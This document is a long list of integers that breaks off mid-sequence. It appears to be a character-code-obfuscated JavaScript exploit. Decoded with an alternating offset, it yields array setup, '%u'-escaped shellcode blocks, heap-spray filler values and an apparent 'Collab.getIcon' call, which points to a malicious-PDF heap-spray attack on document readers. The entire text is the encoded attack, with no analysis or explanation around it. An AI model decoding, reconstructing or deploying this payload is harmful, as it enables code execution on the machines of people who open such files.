100, 123, 118, 108, 88, 173, 103, 109, 107, 124, 88, 173, 104, 104, 120, 104, 88, 173, 103, 109, 107, 124, 88, 173, 104, 104, 108, 123, 88, 173, 104, 107, 104, 107, 88, 173, 104, 107, 104, 107, 88, 173, 104, 107, 104, 107, 88, 173, 106, 109, 121, 126, 88, 173, 118, 111, 99, 112, 88, 173, 108, 123, 103, 109, 88, 173, 99, 104, 103, 108, 88, 173, 99, 104, 99, 104, 88, 173, 121, 126, 104, 107, 88, 173, 104, 126, 119, 111, 88, 173, 117, 110, 99, 126, 88, 173, 104, 122, 118, 104, 88, 173, 118, 107, 118, 113, 88, 173, 107, 122, 104, 109, 88, 173, 104, 105, 120, 123, 88, 173, 104, 107, 104, 105, 88, 173, 104, 111, 104, 110, 88, 173, 103, 106, 105, 121, 88, 173, 106, 106, 120, 112, 88, 173, 99, 104, 99, 104, 88, 173, 107, 122, 99, 104, 88, 173, 102, 107, 119, 112, 88, 173, 107, 109, 121, 110, 88, 173, 104, 113, 119, 122, 88, 173, 103, 109, 118, 111, 88, 173, 105, 105, 121, 112, 88, 173, 105, 109, 101, 125, 88, 173, 118, 111, 106, 112, 88, 173, 121, 123, 103, 109, 88, 173, 99, 104, 105, 109, 88, 173, 99, 104, 99, 104, 88, 173, 104, 110, 106, 125, 88, 173, 103, 109, 107, 124, 88, 173, 104, 104, 121, 112, 88, 173, 120, 112, 104, 110, 88, 173, 99, 104, 104, 105, 88, 173, 99, 104, 99, 104, 88, 173, 104, 104, 104, 113, 88, 173, 117, 105, 120, 112, 88, 173, 121, 126, 121, 125, 88, 173, 107, 109, 121, 126, 88, 173, 104, 113, 118, 104, 88, 173, 106, 108, 104, 113, 88, 173, 107, 124, 102, 113, 88, 173, 99, 105, 103, 110, 88, 173, 120, 112, 104, 104, 88, 173, 99, 104, 102, 122, 88, 173, 99, 104, 99, 104, 88, 173, 121, 112, 107, 122, 88, 173, 103, 109, 107, 124, 88, 173, 104, 104, 121, 112, 88, 173, 101, 105, 120, 112, 88, 173, 121, 126, 121, 126, 88, 173, 107, 109, 121, 126, 88, 173, 104, 113, 118, 104, 88, 173, 106, 108, 104, 113, 88, 173, 104, 111, 99, 123, 88, 173, 99, 105, 120, 112, 88, 173, 121, 126, 121, 126, 88, 173, 104, 113, 121, 126, 88, 173, 103, 108, 118, 110, 88, 173, 121, 126, 102, 112, 88, 173, 104, 104, 106, 107, 88, 173, 103, 109, 107, 124, 88, 173, 121, 125, 121, 112, 88, 173, 104, 112, 99, 104, 88, 173, 103, 109, 107, 124, 88, 173, 104, 104, 121, 112, 88, 173, 120, 112, 104, 111, 88, 173, 121, 125, 106, 108, 88, 173, 121, 126, 121, 126, 88, 173, 104, 113, 104, 113, 88, 173, 103, 110, 103, 110, 88, 173, 121, 107, 102, 122, 88, 173, 116, 121, 106, 123, 88, 173, 104, 125, 104, 126, 88, 173, 118, 113, 104, 122, 88, 173, 104, 109, 118, 107, 88, 173, 120, 123, 107, 122, 88, 173, 104, 107, 104, 105, 88, 173, 105, 104, 105, 110, 88, 173, 102, 106, 117, 105, 88, 173, 99, 104, 120, 112, 88, 173, 99, 104, 99, 104, 88, 173, 104, 112, 99, 104, 88, 173, 99, 112, 102, 112, 88, 173, 99, 107, 106, 108, 88, 173, 120, 122, 103, 104, 88, 173, 103, 104, 121, 113, 88, 173, 104, 124, 107, 122, 88, 173, 107, 104, 99, 112, 88, 173, 103, 106, 121, 122, 88, 173, 99, 112, 106, 109, 88, 173, 119, 122, 102, 107, 88, 173, 100, 112, 107, 121, 88, 173, 118, 107, 107, 122, 88, 173, 100, 111, 120, 122, 88, 173, 100, 112, 102, 112, 88, 173, 100, 105, 106, 110, 88, 173, 102, 107, 103, 104, 88, 173, 107, 108, 118, 113, 88, 173, 106, 108, 119, 122, 88, 173, 103, 104, 99, 123, 88, 173, 99, 112, 102, 112, 88, 173, 121, 122, 106, 109, 88, 173, 121, 125, 103, 104, 88, 173, 120, 122, 118, 122, 88, 173, 102, 107, 121, 106, 88, 173, 107, 113, 118, 104, 88, 173, 121, 123, 103, 109, 88, 173, 103, 109, 107, 122, 88, 173, 104, 122, 121, 123, 88, 173, 118, 107, 118, 113, 88, 173, 99, 106, 102, 106, 88, 173, 106, 108, 105, 112, 88, 173, 106, 104, 106, 108, 88, 173, 101, 126, 102, 121, 88, 173, 105, 126, 101, 126, 88, 173, 106, 109, 106, 113, 88, 173, 105, 123, 105, 125, 88, 173, 105, 125, 105, 105, 88, 173, 101, 125, 105, 108, 88, 173, 106, 106, 105, 126, 88, 173, 101, 126, 105, 111, 88, 173, 106, 106, 105, 110, 88, 173, 105, 111, 105, 105, 88, 173, 106, 107, 106, 109, 88, 173, 105, 126, 101, 126, 88, 173, 106, 121, 105, 112, 88, 173, 102, 106, 105, 122, 88, 173, 105, 109, 101, 125, 88, 173, 105, 109, 106, 112, 88, 173, 105, 112, 99, 104, 88, 173, 106, 108, 106, 108, 88, 173, 102, 121, 106, 104, 88, 173, 101, 126, 101, 126, 88, 173, 106, 113, 105, 126, 88, 173, 105, 125, 106, 109, 88, 173, 105, 105, 105, 123, 88, 173, 105, 108, 105, 125, 88, 173, 105, 126, 101, 125, 88, 173, 105, 111, 106, 106, 88, 173, 105, 110, 101, 126, 88, 173, 105, 105, 106, 106, 88, 173, 106, 109, 105, 111, 88, 173, 101, 126, 106, 107, 88, 173, 105, 123, 105, 107, 88, 173, 105, 107, 105, 113, 88, 173, 101, 125, 105, 122, 88, 173, 105, 112, 106, 104, 88, 173, 102, 126, 106, 104, 88, 173, 102, 124, 106, 106, 88, 173, 99, 104, 99, 104, 85, 97, 110, 69, 61, 65, 60, 174, 148, 170, 83, 165, 152, 165, 146, 153, 165, 170, 148, 177, 83, 117, 83, 166, 152, 175, 83, 121, 165, 170, 148, 177, 91, 97, 110, 69, 61, 65, 60, 174, 148, 170, 83, 155, 150, 88, 112, 88, 99, 176, 99, 155, 99, 155, 99, 155, 99, 155, 110, 69, 61, 65, 60, 174, 148, 170, 83, 153, 151, 156, 165, 88, 112, 88, 99, 176, 103, 104, 99, 104, 99, 104, 110, 69, 61, 65, 60, 174, 148, 170, 83, 171, 150, 151, 159, 157, 161, 88, 112, 88, 166, 160, 152, 164, 159, 155, 162, 156, 152, 102, 159, 157, 161, 159, 167, 160, 83, 98, 83, 106, 110, 69, 61, 65, 60, 174, 148, 170, 83, 164, 152, 166, 83, 117, 83, 153, 151, 156, 165, 88, 96, 88, 91, 171, 150, 151, 159, 157, 161, 99, 99, 176, 102, 112, 92, 115, 64, 66, 60, 65, 169, 153, 165, 88, 172, 153, 165, 171, 163, 88, 112, 88, 168, 166, 152, 171, 150, 153, 163, 157, 91, 90, 88, 173, 108, 104, 108, 104, 88, 173, 108, 104, 108, 104, 85, 97, 110, 69, 61, 65, 60, 177, 148, 170, 166, 168, 83, 117, 83, 158, 156, 176, 146, 161, 167, 96, 172, 153, 165, 171, 163, 100, 83, 164, 152, 166, 92, 115, 64, 66, 60, 65, 169, 153, 165, 88, 150, 167, 168, 166, 167, 106, 83, 117, 83, 96, 150, 155, 83, 101, 83, 104, 171, 108, 99, 104, 99, 104, 99, 97, 98, 153, 151, 156, 165, 115, 64, 66, 60, 65, 153, 167, 165, 88, 91, 174, 148, 170, 83, 155, 162, 173, 161, 172, 83, 117, 83, 104, 110, 88, 150, 167, 168, 166, 167, 88, 111, 88, 150, 167, 168, 166, 167, 106, 110, 88, 150, 167, 168, 166, 167, 99, 94, 97, 174, 69, 61, 65, 60, 65, 160, 157, 160, 151, 148, 170, 165, 153, 172, 147, 150, 167, 168, 166, 167, 149, 83, 117, 83, 177, 148, 170, 166, 168, 83, 99, 83, 171, 155, 157, 159, 164, 150, 167, 151, 157, 110, 69, 61, 65, 60, 181, 64, 66, 60, 65, 169, 153, 165, 88, 162, 174, 152, 170, 153, 164, 162, 175, 83, 117, 83, 173, 161, 157, 166, 155, 148, 168, 152, 96, 85, 93, 168, 104, 150, 104, 150, 93, 168, 104, 150, 104, 150, 90, 92, 115, 64, 66, 60, 65, 170, 160, 156, 164, 152, 88, 91, 167, 169, 157, 165, 158, 159, 167, 170, 102, 159, 157, 161, 159, 167, 160, 83, 116, 83, 108, 103, 113, 104, 106, 92, 179, 64, 66, 60, 65, 60, 167, 169, 157, 165, 158, 159, 167, 170, 88, 94, 117, 83, 167, 169, 157, 165, 158, 159, 167, 170, 115, 64, 66, 60, 65, 176, 69, 61, 65, 60, 172, 155, 161, 166, 102, 150, 167, 159, 164, 148, 154, 134, 172, 162, 170, 152, 88, 112, 88, 118, 167, 159, 164, 148, 154, 97, 155, 162, 164, 159, 157, 150, 172, 120, 165, 148, 161, 159, 129, 161, 158, 162, 96, 174, 171, 168, 154, 157, 114, 83, 90, 85, 100, 160, 171, 154, 114, 83, 167, 169, 157, 165, 158, 159, 167, 170, 181, 92, 115, 64, 66, 60, 181, 64, 66, 64, 66, 60, 158, 168, 166, 150, 172, 156, 167, 161, 88, 150, 167, 159, 164, 148, 154, 146, 159, 152, 172, 156, 155, 162, 166, 91, 97, 174, 69, 61, 65, 60, 161, 153, 88, 91, 153, 163, 168, 97, 156, 162, 155, 97, 123, 162, 164, 159, 153, 149, 102, 154, 157, 167, 129, 150, 167, 161, 97, 174, 69, 61, 65, 60, 65, 169, 153, 165, 88, 148, 170, 165, 177, 83, 117, 83, 166, 152, 175, 83, 121, 165, 170, 148, 177, 91, 97, 110, 69, 61, 65, 60, 65, 169, 153, 165, 88, 169, 174, 163, 157, 167, 160, 172, 153, 83, 117, 83, 173, 161, 157, 166, 155, 148, 168, 152, 96, 85, 93, 168, 125, 117, 125, 108, 93, 168, 104, 99, 104, 100, 93, 168, 109, 105, 104, 99, 93, 168, 121, 100, 110, 103, 93, 168, 104, 99, 107, 99, 93, 168, 104, 99, 104, 99, 93, 168, 108, 99, 112, 117, 93, 168, 112, 117, 104, 118, 93, 168, 105, 118, 111, 99, 93, 168, 112, 117, 121, 119, 93, 168, 104, 107, 108, 99, 93, 168, 123, 102, 109, 120, 93, 168, 112, 117, 109, 104, 93, 168, 112, 117, 125, 118, 93, 168, 104, 107, 108, 104, 93, 168, 107, 102, 109, 101, 93, 168, 123, 100, 124, 101, 93, 168, 104, 102, 123, 101, 93, 168, 105, 99, 107, 101, 93, 168, 112, 99, 108, 99, 93, 168, 104, 99, 107, 107, 93, 168, 126, 104, 111, 104, 93, 168, 123, 101, 112, 117, 93, 168, 109, 119, 109, 116, 93, 168, 104, 103, 123, 101, 93, 168, 109, 104, 104, 99, 93, 168, 125, 118, 112, 117, 93, 168, 109, 100, 109, 100, 93, 168, 109, 105, 109, 102, 93, 168, 110, 99, 109, 106, 93, 168, 109, 119, 112, 117, 93, 168, 107, 102, 104, 107, 93, 168, 112, 117, 123, 99, 93, 168, 104, 118, 111, 104, 93, 168, 126, 120, 112, 117, 93, 168, 111, 105, 104, 102, 93, 168, 112, 117, 107, 118, 93, 168, 111, 107, 108, 120, 93, 168, 123, 121, 104, 102, 93, 168, 109, 100, 112, 117, 93, 168, 109, 101, 105, 118, 93, 168, 109, 100, 112, 117, 93, 168, 109, 101, 106, 103, 93, 168, 111, 100, 112, 117, 93, 168, 108, 120, 105, 103, 93, 168, 111, 104, 112, 108, 93, 168, 112, 117, 126, 118, 93, 168, 106, 99, 111, 100, 93, 168, 126, 106, 104, 102, 93, 168, 108, 116, 113, 108, 93, 168, 108, 101, 121, 119, 93, 168, 107, 117, 110, 99, 93, 168, 126, 118, 109, 104, 93, 168, 104, 103, 111, 104, 93, 168, 123, 99, 107, 102, 93, 168, 107, 106, 125, 117, 93, 168, 126, 121, 107, 102, 93, 168, 108, 104, 104, 102, 93, 168, 113, 106, 104, 118, 93, 168, 123, 121, 112, 117, 93, 168, 111, 104, 121, 120, 93, 168, 106, 117, 126, 119, 93, 168, 108, 121, 126, 108, 93, 168, 125, 107, 109, 100, 93, 168, 126, 121, 113, 103, 93, 168, 126, 121, 126, 121, 93, 168, 123, 102, 107, 117, 93, 168, 111, 103, 110, 100, 93, 168, 125, 117, 104, 101, 93, 168, 112, 117, 124, 108, 93, 168, 104, 118, 108, 104, 93, 168, 109, 120, 113, 101, 93, 168, 126, 101, 104, 102, 93, 168, 125, 99, 124, 100, 93, 168, 123, 105, 104, 102, 93, 168, 123, 108, 107, 102, 93, 168, 122, 106, 104, 121, 93, 168, 109, 121, 104, 107, 93, 168, 125, 100, 123, 100, 93, 168, 104, 102, 104, 101, 93, 168, 104, 102, 123, 116, 93, 168, 112, 117, 123, 121, 93, 168, 104, 102, 104, 100, 93, 168, 112, 108, 123, 101, 93, 168, 126, 107, 108, 104, 93, 168, 112, 117, 110, 100, 93, 168, 126, 107, 108, 104, 93, 168, 109, 120, 109, 121, 93, 168, 123, 108, 109, 117, 93, 168, 109, 104, 123, 102, 93, 168, 125, 118, 112, 117, 93, 168, 125, 107, 109, 100, 93, 168, 126, 121, 108, 108, 93, 168, 126, 121, 126, 121, 93, 168, 110, 107, 109, 99, 93, 168, 110, 99, 125, 107, 93, 168, 104, 103, 122, 121, 93, 168, 110, 118, 125, 107, 93, 168, 126, 121, 126, 121, 93, 168, 107, 102, 126, 121, 93, 168, 109, 101, 124, 101, 93, 168, 126, 121, 109, 101, 93, 168, 104, 107, 111, 104, 93, 168, 124, 99, 126, 121, 93, 168, 108, 104, 112, 108, 93, 168, 112, 117, 126, 118, 93, 168, 126, 118, 108, 104, 93, 168, 123, 102, 123, 108, 93, 168, 112, 117, 109, 104, 93, 168, 112, 102, 125, 118, 93, 168, 104, 118, 125, 118, 93, 168, 108, 104, 112, 119, 93, 168, 109, 99, 126, 103, 93, 168, 108, 104, 123, 105, 93, 168, 111, 104, 126, 103, 93, 168, 108, 104, 123, 105, 93, 168, 111, 101, 126, 104, 93, 168, 108, 104, 123, 105, 93, 168, 110, 118, 126, 105, 93, 168, 108, 104, 123, 105, 93, 168, 110, 119, 126, 106, 93, 168, 108, 104, 123, 105, 93, 168, 110, 121, 126, 107, 93, 168, 108, 104, 123, 105, 93, 168, 110, 120, 126, 108, 93, 168, 108, 104, 123, 105, 93, 168, 106, 120, 126, 116, 93, 168, 108, 104, 123, 105, 93, 168, 110, 103, 126, 117, 93, 168, 108, 104, 123, 105, 93, 168, 110, 118, 126, 118, 93, 168, 108, 104, 123, 105, 93, 168, 110, 118, 126, 119, 93, 168, 108, 104, 123, 105, 93, 168, 104, 99, 126, 120, 93, 168, 121, 99, 125, 107, 93, 168, 126, 121, 126, 121, 93, 168, 109, 99, 126, 121, 93, 168, 109, 119, 110, 107, 93, 168, 105, 100, 112, 116, 93, 168, 125, 107, 105, 105, 93, 168, 126, 121, 105, 104, 93, 168, 126, 121, 126, 121, 93, 168, 123, 103, 112, 102, 93, 168, 112, 104, 104, 118, 93, 168, 111, 103, 123, 99, 93, 168, 110, 116, 105, 104, 93, 168, 110, 116, 104, 99, 93, 168, 126, 121, 104, 99, 93, 168, 104, 118, 111, 104, 93, 168, 111, 104, 126, 121, 93, 168, 110, 116, 104, 107, 93, 168, 126, 121, 104, 99, 93, 168, 112, 104, 124, 99, 93, 168, 111, 104, 123, 99, 93, 168, 108, 99, 104, 102, 93, 168, 123, 102, 123, 108, 93, 168, 123, 99, 107, 102, 93, 168, 123, 102, 123, 108, 93, 168, 107, 102, 109, 106, 93, 168, 112, 117, 123, 99, 93, 168, 106, 103, 108, 118, 93, 168, 112, 117, 104, 118, 93, 168, 106, 103, 111, 118, 93, 168, 126, 118, 104, 107, 93, 168, 121, 116, 126, 102, 93, 168, 123, 102, 109, 121, 93, 168, 108, 118, 112, 117, 93, 168, 104, 103, 106, 103, 93, 168, 107, 108, 112, 99, 93, 168, 112, 117, 104, 99, 93, 168, 111, 103, 123, 100, 93, 168, 108, 99, 104, 105, 93, 168, 107, 107, 112, 99, 93, 168, 111, 104, 104, 99, 93, 168, 106, 117, 126, 116, 93, 168, 123, 102, 123, 100, 93, 168, 112, 117, 109, 104, 93, 168, 112, 102, 125, 118, 93, 168, 110, 103, 125, 118, 93, 168, 112, 119, 109, 102, 93, 168, 126, 99, 108, 104, 93, 168, 107, 102, 109, 106, 93, 168, 109, 99, 124, 117, 93, 168, 108, 104, 123, 105, 93, 168, 110, 117, 126, 99, 93, 168, 108, 104, 123, 105, 93, 168, 110, 104, 126, 100, 93, 168, 108, 104, 123, 105, 93, 168, 111, 101, 126, 101, 93, 168, 108, 104, 123, 105, 93, 168, 110, 120, 126, 102, 93, 168, 108, 104, 123, 105, 93, 168, 110, 104, 126, 103, 93, 168, 108, 104, 123, 105, 93, 168, 110, 118, 126, 104, 93, 168, 108, 104, 123, 105, 93, 168, 107, 102, 126, 105, 93, 168, 108, 104, 123, 105, 93, 168, 107, 101, 126, 106, 93, 168, 108, 104, 123, 105, 93, 168, 106, 120, 126, 107, 93, 168, 108, 104, 123, 105, 93, 168, 110, 103, 126, 108, 93, 168, 108, 104, 123, 105, 93, 168, 110, 118, 126, 116, 93, 168, 108, 104, 123, 105, 93, 168, 110, 118, 126, 117, 93, 168, 109, 119, 112, 107, 93, 168, 125, 107, 126, 118, 93, 168, 126, 121, 104, 117, 93, 168, 126, 121, 126, 121, 93, 168, 110, 107, 109, 99, 93, 168, 108, 102, 110, 107, 93, 168, 112, 120, 126, 108, 93, 168, 112, 99, 125, 107, 93, 168, 126, 121, 126, 120, 93, 168, 112, 117, 126, 121, 93, 168, 112, 119, 126, 107, 93, 168, 113, 118, 108, 104, 93, 168, 108, 103, 110, 116, 93, 168, 125, 107, 109, 99, 93, 168, 126, 121, 111, 120, 93, 168, 126, 121, 126, 121, 93, 168, 108, 104, 112, 119, 93, 168, 110, 116, 125, 99, 93, 168, 109, 99, 105, 99, 93, 168, 111, 102, 125, 107, 93, 168, 126, 121, 126, 121, 93, 168, 112, 102, 126, 121, 93, 168, 105, 118, 123, 103, 93, 168, 108, 104, 112, 119, 93, 168, 109, 99, 125, 99, 93, 168, 108, 104, 112, 119, 93, 168, 109, 99, 113, 118, 93, 168, 109, 102, 109, 102, 93, 168, 109, 102, 109, 102, 93, 168, 109, 102, 109, 102, 93, 168, 111, 104, 126, 121, 93, 168, 123, 106, 104, 107, 93, 168, 113, 118, 108, 104, 93, 168, 104, 99, 108, 103, 93, 168, 104, 99, 104, 99, 93, 168, 126, 121, 109, 102, 93, 168, 109, 121, 124, 106, 93, 168, 122, 105, 104, 121, 93, 168, 109, 117, 123, 99, 93, 168, 123, 102, 123, 108, 93, 168, 112, 117, 109, 104, 93, 168, 109, 100, 125, 118, 93, 168, 109, 102, 109, 100, 93, 168, 109, 106, 109, 105, 93, 168, 108, 101, 110, 116, 93, 168, 111, 101, 125, 107, 93, 168, 104, 99, 104, 99, 93, 168, 112, 117, 104, 99, 93, 168, 107, 102, 124, 107, 93, 168, 112, 104, 126, 105, 93, 168, 109, 108, 124, 117, 93, 168, 108, 104, 123, 106, 93, 168, 110, 100, 126, 107, 93, 168, 110, 104, 106, 120, 93, 168, 123, 106, 111, 107, 93, 168, 126, 118, 108, 104, 93, 168, 104, 99, 110, 104, 93, 168, 104, 99, 104, 99, 93, 168, 109, 105, 111, 120, 93, 168, 108, 104, 112, 119, 93, 168, 109, 99, 126, 107, 93, 168, 125, 107, 109, 105, 93, 168, 104, 99, 109, 100, 93, 168, 104, 99, 104, 99, 93, 168, 109, 99, 109, 108, 93, 168, 122, 100, 125, 107, 93, 168, 126, 121, 126, 120, 93, 168, 112, 104, 126, 121, 93, 168, 109, 108, 123, 99, 93, 168, 111, 103, 109, 108, 93, 168, 112, 119, 107, 108, 93, 168, 104, 100, 108, 105, 93, 168, 125, 107, 109, 99, 93, 168, 104, 99, 107, 117, 93, 168, 104, 99, 104, 99, 93, 168, 126, 107, 112, 117, 93, 168, 108, 104, 112, 119, 93, 168, 109, 99, 126, 107, 93, 168, 106, 100, 125, 107, 93, 168, 126, 121, 126, 121, 93, 168, 112, 104, 126, 121, 93, 168, 109, 108, 123, 99, 93, 168, 111, 103, 109, 108, 93, 168, 109, 106, 104, 118, 93, 168, 104, 100, 125, 107, 93, 168, 126, 121, 126, 121, 93, 168, 109, 108, 126, 121, 93, 168, 108, 103, 123, 105, 93, 168, 126, 121, 107, 107, 93, 168, 109, 99, 111, 102, 93, 168, 108, 104, 112, 119, 93, 168, 126, 120, 126, 107, 93, 168, 109, 107, 104, 99, 93, 168, 108, 104, 112, 119, 93, 168, 109, 99, 126, 107, 93, 168, 125, 107, 109, 106, 93, 168, 126, 120, 111, 103, 93, 168, 126, 121, 126, 121, 93, 168, 109, 108, 109, 108, 93, 168, 108, 105, 108, 105, 93, 168, 126, 102, 107, 117, 93, 168, 121, 116, 111, 118, 93, 168, 109, 120, 109, 121, 93, 168, 123, 108, 109, 117, 93, 168, 109, 104, 123, 102, 93, 168, 125, 118, 112, 117, 93, 168, 109, 102, 109, 100, 93, 168, 110, 99, 110, 105, 93, 168, 107, 101, 122, 100, 93, 168, 104, 99, 125, 107, 93, 168, 104, 99, 104, 99, 93, 168, 109, 107, 104, 99, 93, 168, 104, 107, 107, 107, 93, 168, 104, 102, 111, 103, 93, 168, 125, 117, 108, 99, 93, 168, 108, 99, 126, 108, 93, 168, 109, 119, 112, 117, 93, 168, 112, 99, 104, 107, 93, 168, 108, 101, 126, 117, 93, 168, 104, 107, 111, 104, 93, 168, 124, 117, 107, 102, 93, 168, 105, 107, 112, 116, 93, 168, 123, 102, 112, 117, 93, 168, 105, 106, 125, 117, 93, 168, 105, 107, 107, 107, 93, 168, 105, 100, 111, 105, 93, 168, 107, 102, 108, 99, 93, 168, 112, 103, 123, 108, 93, 168, 111, 103, 124, 117, 93, 168, 108, 99, 104, 118, 93, 168, 104, 107, 107, 107, 93, 168, 126, 117, 111, 104, 93, 168, 126, 120, 108, 99, 93, 168, 125, 117, 123, 117, 93, 168, 107, 102, 126, 101, 93, 168, 112, 108, 123, 99, 93, 168, 126, 118, 108, 104, 93, 168, 108, 104, 112, 117, 93, 168, 109, 117, 126, 118, 93, 168, 123, 102, 123, 108, 93, 168, 104, 101, 107, 101, 93, 168, 111, 103, 110, 107, 93, 168, 111, 99, 111, 103, 93, 168, 106, 121, 107, 116, 93, 168, 110, 121, 106, 121, 93, 168, 111, 104, 111, 108, 93, 168, 110, 118, 110, 120, 93, 168, 110, 120, 110, 100, 93, 168, 106, 120, 110, 103, 93, 168, 111, 101, 110, 121, 93, 168, 106, 121, 110, 106, 93, 168, 111, 101, 110, 105, 93, 168, 110, 106, 110, 100, 93, 168, 111, 102, 111, 104, 93, 168, 110, 103, 106, 121, 93, 168, 110, 105, 110, 104, 93, 168, 110, 121, 110, 119, 93, 168, 107, 101, 111, 103, 93, 168, 110, 104, 106, 120, 93, 168, 110, 104, 111, 107, 93, 168, 110, 107, 104, 99, 93, 168, 111, 103, 111, 103, 93, 168, 107, 116, 111, 99, 93, 168, 106, 121, 106, 121, 93, 168, 111, 108, 110, 121, 93, 168, 110, 120, 111, 104, 93, 168, 110, 100, 110, 118, 93, 168, 110, 103, 110, 120, 93, 168, 110, 121, 106, 120, 93, 168, 110, 106, 111, 101, 93, 168, 110, 105, 106, 121, 93, 168, 110, 100, 111, 101, 93, 168, 111, 104, 110, 106, 93, 168, 106, 121, 111, 102, 93, 168, 110, 118, 110, 102, 93, 168, 110, 102, 110, 108, 93, 168, 106, 120, 110, 117, 93, 168, 110, 107, 111, 99, 93, 168, 107, 121, 111, 99, 93, 168, 107, 119, 111, 101, 93, 168, 104, 99, 104, 99, 90, 92, 115, 64, 66, 60, 65, 60, 174, 148, 170, 83, 160, 138, 169, 104, 104, 99, 123, 129, 88, 112, 88, 169, 174, 163, 157, 167, 160, 172, 153, 97, 164, 152, 166, 154, 172, 155, 88, 93, 88, 101, 115, 64, 66, 60, 65, 60, 174, 148, 170, 83, 164, 152, 166, 83, 117, 83, 104, 171, 108, 99, 104, 99, 104, 99, 88, 96, 88, 91, 160, 138, 169, 104, 104, 99, 123, 129, 88, 94, 88, 99, 176, 102, 112, 92, 115, 64, 66, 60, 65, 60, 174, 148, 170, 83, 177, 148, 170, 166, 168, 83, 117, 83, 173, 161, 157, 166, 155, 148, 168, 152, 96, 85, 93, 168, 113, 99, 113, 99, 93, 168, 113, 99, 113, 99, 90, 92, 115, 64, 66, 60, 65, 60, 177, 148, 170, 166, 168, 83, 117, 83, 158, 156, 176, 146, 161, 167, 96, 172, 153, 165, 171, 163, 100, 83, 164, 152, 166, 92, 115, 64, 66, 60, 65, 60, 174, 148, 170, 83, 168, 104, 121, 157, 131, 105, 109, 153, 88, 112, 88, 91, 104, 171, 104, 150, 104, 150, 104, 150, 104, 150, 88, 96, 88, 99, 176, 103, 104, 99, 104, 99, 104, 92, 88, 98, 88, 99, 176, 103, 104, 99, 104, 99, 104, 110, 69, 61, 65, 60, 65, 153, 167, 165, 88, 91, 174, 148, 170, 83, 174, 164, 155, 132, 124, 108, 110, 172, 88, 112, 88, 99, 115, 83, 174, 164, 155, 132, 124, 108, 110, 172, 88, 111, 88, 163, 109, 116, 162, 126, 110, 104, 158, 110, 88, 169, 169, 150, 137, 119, 113, 105, 177, 83, 99, 94, 88, 92, 179, 64, 66, 60, 65, 60, 65, 148, 170, 165, 177, 142, 174, 164, 155, 132, 124, 108, 110, 172, 149, 83, 117, 83, 177, 148, 170, 166, 168, 83, 99, 83, 174, 169, 168, 152, 172, 155, 177, 148, 115, 64, 66, 60, 65, 60, 181, 64, 66, 60, 65, 60, 174, 148, 170, 83, 172, 136, 133, 155, 134, 149, 127, 170, 88, 112, 88, 168, 166, 152, 171, 150, 153, 163, 157, 91, 90, 88, 104, 108, 90, 92, 115, 64, 66, 60, 65, 60, 175, 155, 161, 159, 157, 83, 96, 167, 141, 128, 160, 129, 154, 122, 175, 97, 164, 152, 166, 154, 172, 155, 88, 111, 88, 99, 176, 103, 104, 99, 104, 92, 179, 64, 66, 60, 65, 60, 65, 167, 141, 128, 160, 129, 154, 122, 175, 83, 99, 112, 88, 167, 141, 128, 160, 129, 154, 122, 175, 110, 69, 61, 65, 60, 65, 176, 69, 61, 65, 60, 65, 167, 141, 128, 160, 129, 154, 122, 175, 83, 117, 83, 90, 129, 102, 85, 88, 94, 88, 167, 141, 128, 160, 129, 154, 122, 175, 110, 69, 61, 65, 60, 65, 148, 168, 163, 102, 151, 167, 150, 102, 118, 167, 159, 164, 148, 154, 97, 159, 152, 172, 124, 155, 162, 166, 91, 172, 136, 133, 155, 134, 149, 127, 170, 97, 110, 69, 61, 65, 60, 181, 64, 66, 60, 181, 64, 66, 64, 66, 60, 158, 168, 166, 150, 172, 156, 167, 161, 88, 163, 156, 153, 151, 166, 172, 148, 170, 167, 96, 92, 179, 64, 66, 64, 66, 60, 65, 169, 153, 165, 88, 169, 157, 165, 171, 156, 167, 161, 88, 112, 88, 148, 168, 163, 102, 169, 161, 152, 175, 152, 170, 137, 157, 165, 171, 156, 167, 161, 102, 167, 167, 134, 172, 165, 161, 161, 159, 91, 97, 110, 69, 61, 65, 60, 174, 152, 170, 166, 161, 162, 166, 83, 117, 83, 174, 152, 170, 166, 161, 162, 166, 97, 170, 152, 168, 159, 153, 150, 157, 91, 103, 143, 124, 98, 159, 95, 95, 90, 97, 110, 69, 61, 65, 60, 174, 148, 170, 83, 174, 148, 170, 166, 161, 162, 166, 146, 153, 165, 170, 148, 177, 83, 117, 83, 166, 152, 175, 83, 121, 165, 170, 148, 177, 91, 174, 152, 170, 166, 161, 162, 166, 97, 155, 155, 153, 165, 121, 167, 96, 99, 97, 95, 88, 169, 157, 165, 171, 156, 167, 161, 102, 150, 160, 148, 170, 116, 172, 91, 105, 92, 100, 83, 174, 152, 170, 166, 161, 162, 166, 97, 155, 155, 153, 165, 121, 167, 96, 101, 97, 92, 115, 64, 66, 60, 65, 156, 158, 83, 96, 91, 174, 148, 170, 166, 161, 162, 166, 146, 153, 165, 170, 148, 177, 142, 104, 144, 88, 112, 117, 83, 112, 92, 88, 89, 94, 83, 96, 169, 153, 165, 171, 156, 167, 161, 151, 148, 170, 165, 153, 172, 147, 100, 149, 83, 117, 112, 88, 99, 97, 83, 180, 175, 88, 91, 174, 148, 170, 166, 161, 162, 166, 146, 153, 165, 170, 148, 177, 142, 105, 144, 88, 112, 117, 83, 105, 83, 94, 89, 88, 169, 153, 165, 171, 156, 167, 161, 151, 148, 170, 165, 153, 172, 147, 101, 149, 83, 116, 83, 107, 92, 97, 174, 69, 61, 65, 60, 65, 168, 172, 156, 164, 146, 168, 165, 161, 161, 172, 153, 96, 92, 115, 64, 66, 60, 65, 176, 69, 61, 65, 60, 161, 153, 88, 91, 96, 169, 153, 165, 171, 156, 167, 161, 151, 148, 170, 165, 153, 172, 147, 99, 149, 83, 116, 83, 112, 92, 88, 175, 180, 83, 96, 169, 153, 165, 171, 156, 167, 161, 151, 148, 170, 165, 153, 172, 147, 99, 149, 83, 117, 112, 88, 107, 88, 89, 94, 83, 174, 148, 170, 166, 161, 162, 166, 146, 153, 165, 170, 148, 177, 142, 105, 144, 88, 111, 88, 101, 88, 89, 94, 83, 174, 148, 170, 166, 161, 162, 166, 146, 153, 165, 170, 148, 177, 142, 106, 144, 88, 111, 88, 101, 97, 92, 179, 64, 66, 60, 65, 60, 155, 162, 164, 159, 153, 149, 151, 152, 165, 148, 161, 159, 96, 92, 115, 64, 66, 60, 65, 176, 69, 61, 65, 60, 161, 153, 88, 91, 96, 169, 153, 165, 171, 156, 167, 161, 151, 148, 170, 165, 153, 172, 147, 99, 149, 83, 116, 83, 113, 92, 88, 175, 180, 83, 96, 169, 153, 165, 171, 156, 167, 161, 151, 148, 170, 165, 153, 172, 147, 99, 149, 83, 117, 112, 88, 108, 88, 89, 94, 83, 174, 148, 170, 166, 161, 